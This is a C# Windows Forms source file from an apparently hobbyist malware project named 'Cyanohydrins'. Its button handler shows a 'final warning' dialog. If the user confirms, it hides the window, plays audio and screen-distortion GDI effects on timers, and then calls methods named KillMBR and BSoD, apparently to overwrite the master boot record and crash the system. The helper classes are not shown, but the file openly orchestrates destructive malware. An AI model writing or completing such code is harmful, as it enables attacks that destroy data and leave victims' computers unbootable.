using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Cyanohydrins
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show(

                           "THIS IS THE FINAL WARNING.\n" +
                           "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES OR DATALOSS TO YOUR COMPUTER AND PLEASE NOTE THIS MALWARE IS DANGEROUS." +
                           "ARE YOU SURE YOU WANT TO EXECUTE THIS MALWARE? THIS IS YOUR LAST CHANCE OF GETTING RID OF THIS MALWARE IN 1% CHANCE.",
                           "welp geuss your computer is fucked now", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
            {
                this.Hide();
                new Thread(soundaud.Audio).Start();
                new Thread(soundaud.Beeps).Start();
                new Thread(Grap.GDI1).Start();
                Thread.Sleep(10000);
                new Thread(Grap.GDI1or1).Start();
                Thread.Sleep(10000);
                new Thread(Grap.GDI2).Start();
                new Thread(Grap.GDI2or1).Start();
                Thread.Sleep(30000);
                new Thread(Grap.GDI3).Start();
                new Thread(Grap.GDI3or1).Start();
                new Thread(Grap.GDI3or2).Start();
                Thread.Sleep(30000);
                new Thread(Grap.GDI4).Start();
                Thread.Sleep(40000);
                new Thread(Grap.GDI2).Start();
                new Thread(Grap.GDI2or1).Start();
                new Thread(Grap.GDI3or1).Start();
                new Thread(Grap.GDI1or1).Start();
                new Thread(Grap.GDI1).Start();
                Thread.Sleep(5000);
                new Thread(destruction.KillMBR).Start();
                new Thread(destruction.BSoD).Start();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
   
